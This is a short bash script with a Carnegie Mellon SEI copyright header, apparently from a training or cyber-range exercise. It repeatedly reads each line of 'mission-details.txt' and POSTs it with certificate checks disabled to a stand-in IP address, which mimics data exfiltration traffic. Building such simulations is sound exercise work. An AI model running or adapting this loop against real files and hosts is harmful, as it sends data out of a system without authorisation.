#!/bin/bash

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

while :
do
    while read line; do curl -k -d $line -X POST --verbose https://203.0.113.137 & sleep .5; done < ./mission-details.txt
done
